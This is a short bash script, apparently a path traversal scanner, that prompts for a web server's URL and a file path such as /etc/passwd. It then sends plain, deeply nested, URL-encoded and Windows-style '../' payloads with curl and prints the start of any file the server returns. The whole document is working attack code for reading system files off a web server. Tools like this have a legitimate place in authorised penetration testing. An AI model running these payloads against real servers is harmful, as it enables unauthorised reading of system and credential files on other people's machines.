#!/bin/bash

# Prompt the user for the base URL and file path
read -p "Enter Base URL (e.g., http://example.com): " base_url
read -p "Enter the file path to test (e.g., /etc/passwd): " target_path

# Define the payloads
payloads=(
    "$target_path"
    "../../$target_path"
    "../../../../../$target_path"
    "../../../../../../../../$target_path"
    "..%2F..%2F..%2F$target_path"   # URL encode
    "..\\..\\..\\..\\$target_path"  # Windows path separator
    "..%5C..%5C..%5C$target_path"   # Windows path separator with URL encode
)

for payload in "${payloads[@]}"; do
    encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri)  # URL encode
    url="$base_url/$encoded_payload"
    
    echo "Testing: $url"
    
    # Send a request using cURL
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url")

    if [ "$response" -eq 200 ]; then
        echo "[+] Successful: $url"
        echo "Response:"
        curl -s "$url" | head -n 20 # its enough to see!
        echo "----------------------------------------"
    else
        echo "[-] Unreachable: $url (HTTP Status Code: $response)"
    fi
done
